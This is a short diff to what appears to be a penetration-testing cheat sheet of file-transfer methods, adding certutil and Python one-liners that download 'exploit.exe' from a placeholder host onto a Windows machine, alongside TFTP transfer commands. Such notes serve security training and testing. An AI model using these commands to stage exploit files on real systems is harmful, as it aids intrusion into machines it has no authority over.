@@ -14,3 +14,11 @@ atftpd --daemon --port 69 /tftp
 /etc/init.d/atftpd restart
 - Client
 tftp -i 192.160.1.101 GET wget.exe
+
+# Certutil
+- Client:
+certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
+
+# Python
+- Client:
+python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/exploit.exe', 'C:\\Users\\Public\\Downloads\\exploit.exe');"
